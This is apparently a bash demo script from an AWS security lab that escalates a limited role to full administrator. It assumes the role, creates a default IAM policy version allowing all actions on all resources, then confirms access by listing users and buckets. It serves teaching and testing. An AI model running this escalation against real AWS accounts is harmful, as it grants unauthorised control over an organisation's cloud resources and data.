#!/bin/bash

# Demo script for iam:CreatePolicyVersion privilege escalation
# This is a ROLE-BASED self-escalation scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-001-to-admin-starting-user"
STARTING_ROLE="pl-prod-iam-001-to-admin-starting-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreatePolicyVersion Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based Self-Escalation${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_001_iam_createpolicyversion.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and policy ARN
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
POLICY_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.policy_arn')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}"
echo "Policy ARN: $POLICY_ARN"
echo ""

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity as user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $ROLE_ARN"

show_cmd "Attacker" "aws sts assume-role --role-arn \"$ROLE_ARN\" --role-session-name \"iam-001-demo-session\""
ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$ROLE_ARN" \
    --role-session-name "iam-001-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# Step 4: Test current permissions (should be limited)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
    echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
else
    echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
fi

# Step 5: Perform privilege escalation via CreatePolicyVersion
echo -e "${YELLOW}Step 5: Escalating privileges via iam:CreatePolicyVersion${NC}"
echo "Creating new policy version with admin permissions..."

# Create admin policy document
cat > /tmp/admin-policy-version.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        }
    ]
}
EOF

echo "New policy version content:"
cat /tmp/admin-policy-version.json

# Create new policy version and set as default
show_attack_cmd "Attacker" "aws iam create-policy-version --policy-arn \"$POLICY_ARN\" --policy-document file:///tmp/admin-policy-version.json --set-as-default"
aws iam create-policy-version \
    --policy-arn "$POLICY_ARN" \
    --policy-document file:///tmp/admin-policy-version.json \
    --set-as-default

echo -e "${GREEN}✓ Successfully created new policy version with admin permissions!${NC}\n"

# Wait for policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
sleep 15
echo ""

# Step 6: Verify admin access
echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
echo "Testing admin permissions (listing IAM users)..."
show_cmd "Attacker" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"

echo "Testing S3 access..."
show_cmd "Attacker" "aws s3 ls"
aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"

echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# Clean up temp file
rm -f /tmp/admin-policy-version.json

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:CreatePolicyVersion${NC} to create admin policy version"
echo -e "Result: ${GREEN}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (CreatePolicyVersion) → Admin"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the malicious policy version${NC}"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
